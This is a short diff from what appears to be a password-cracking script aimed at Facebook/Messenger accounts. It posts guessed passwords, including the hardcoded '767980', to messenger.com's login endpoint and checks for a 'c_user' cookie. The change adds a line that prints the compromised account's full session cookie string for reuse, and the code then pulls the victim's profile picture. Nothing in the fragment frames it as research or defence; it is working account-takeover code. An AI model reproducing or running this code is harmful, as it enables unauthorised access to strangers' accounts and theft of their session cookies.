@@ -752,8 +752,9 @@ def crackasync(idf,pwv):
 			data.update({"pass":"".join('767980')})
 			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)		
 			if 'c_user' in ses.cookies.get_dict():
-				print(f'\r{h}[die-check]{u}{idf}|{u}{pw}{x}\n')
+				#print(f'\r{h}[die-check]{u}{idf}|{u}{pw}{x}\n')
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
+				print(f'{k}Cookie - {h}{kuki}{x}')
 				cok = Session.cookies.get_dict()
 				idf = cok["c_user"]
 				ckk = f'https://graph.facebook.com/{idf}/picture?type=normal'
